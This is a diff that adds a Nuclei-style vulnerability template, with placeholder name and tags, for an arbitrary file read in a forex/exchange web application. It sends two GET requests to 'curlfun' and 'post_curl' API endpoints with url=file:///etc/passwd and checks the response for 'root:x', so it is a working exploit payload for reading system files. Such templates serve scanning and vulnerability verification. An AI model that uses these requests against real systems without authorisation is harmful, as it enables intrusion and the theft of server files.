@@ -1,0 +1,19 @@
+id: fxl-curlfun-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 仿新浪外汇余额宝时间交易所任意文件读取
+  reference:
+    - https://github.com/wy876/POC/blob/33aeb58103048c9c34340cd4ddef97c9a853f798/%E4%BB%BF%E6%96%B0%E6%B5%AA%E5%A4%96%E6%B1%87%E4%BD%99%E9%A2%9D%E5%AE%9D%E6%97%B6%E9%97%B4%E4%BA%A4%E6%98%93%E6%89%80%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/index/Api/curlfun?url=file:///etc/passwd"
+      - "{{BaseURL}}//index.php/index/Api/post_curl?url=file:///etc/passwd&data=1"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x'
